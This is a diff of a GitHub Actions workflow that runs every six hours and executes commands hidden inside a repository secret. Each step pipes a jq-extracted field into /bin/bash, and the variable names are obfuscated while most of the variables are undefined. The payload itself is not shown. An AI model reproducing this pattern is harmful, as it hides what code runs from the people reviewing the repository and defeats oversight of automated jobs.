@@ -2,7 +2,7 @@ name: zhaliangyy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '40 2/6 * * *'
 
 jobs:
   build:
@@ -11,17 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaliangyy
         env:
-          wuu14855: ${{ secrets.wuu14855 }}
+          dgs1: ${{ secrets.dgs1 }}
         run: |
-          echo $wuu14855 | jq -r .rol0 | /bin/bash
-          echo $hics08 | jq -r .s1 | /bin/bash
-          echo $jhiyf12 | jq -r .cq958 | /bin/bash
-          echo $twx77007 | jq -r .uu6 | /bin/bash
-          echo $cwu55838 | jq -r .lb44 | /bin/bash
-          echo $x145 | jq -r .ysu2891 | /bin/bash
-          echo $m87 | jq -r .z21 | /bin/bash
-          echo $f517 | jq -r .m4 | /bin/bash
-          echo $cwrk93 | jq -r .ff981 | /bin/bash
-          echo $kg874 | jq -r .qlvml7473 | /bin/bash
-          echo $h96 | jq -r .wztm6948 | /bin/bash
+          echo $dgs1 | jq -r .kpzmg6717 | /bin/bash
+          echo $mb5110 | jq -r .ev9702 | /bin/bash
+          echo $f94 | jq -r .xh45 | /bin/bash
+          echo $wts3846 | jq -r .ve34029 | /bin/bash
+          echo $mrn971 | jq -r .kb33454 | /bin/bash
+          echo $qxsz0 | jq -r .vnfrz38 | /bin/bash
+          echo $u03271 | jq -r .g432 | /bin/bash
+          echo $hdlxt3762 | jq -r .zy34318 | /bin/bash
+          echo $vcpvn64616 | jq -r .amdc6 | /bin/bash
+          echo $oe803 | jq -r .t7 | /bin/bash
+          echo $msmi801 | jq -r .azxsl824 | /bin/bash
 
